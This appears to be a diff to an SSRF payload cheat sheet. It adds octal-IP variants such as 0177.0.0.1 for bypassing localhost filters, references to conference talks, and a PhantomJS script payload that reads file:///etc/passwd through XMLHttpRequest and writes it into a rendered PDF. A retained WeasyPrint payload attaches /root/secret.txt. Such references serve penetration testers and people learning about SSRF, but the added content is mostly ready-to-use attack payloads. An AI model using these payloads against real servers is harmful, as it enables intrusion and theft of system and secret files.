@@ -12,6 +12,7 @@
   * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
   * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
   * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
+  * [Bypass using octal IP](#bypass-using-octal-ip)
   * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
   * [Bypass using malformed urls](#bypass-using-malformed-urls)
   * [Bypass using rare address](#bypass-using-rare-address)
@@ -136,12 +137,28 @@ http://127.0.0.0
 ### Bypass using a decimal IP location
 
 ```powershell
-http://0177.0.0.1/
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
 http://2852039166/  = http://169.254.169.254
 ```
+
+### Bypass using octal IP
+
+Implementations differ on how to handle octal format of ipv4.
+
+```sh
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+...
+```
+
+Ref: 
+- [DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing](https://www.youtube.com/watch?v=_o1RPJAe4kU)
+- [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
+
 
 ### Bypass using IPv6/IPv4 Address Embedding
 
@@ -433,12 +450,24 @@ gopher://127.0.0.1:6379/_save
 
 ## SSRF exploiting PDF file
 
-![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.jpg?raw=true)
+![https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png)
 
 Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
 
 ```powershell
 <link rel=attachment href="file:///root/secret.txt">
+```
+
+Example with PhantomJS 
+
+```js
+<script>
+    exfil = new XMLHttpRequest();
+    exfil.open("GET","file:///etc/passwd");
+    exfil.send();
+    exfil.onload = function(){document.write(this.responseText);}
+    exfil.onerror = function(){document.write('failed!')}
+</script>
 ```
 
 ## Blind SSRF
@@ -797,6 +826,7 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 
 ## References
 
+- [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
 - [Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13](https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
 - [ESEA Server-Side Request Forgery and Querying AWS Meta Data](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/) by Brett Buerhaus
 - [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857)
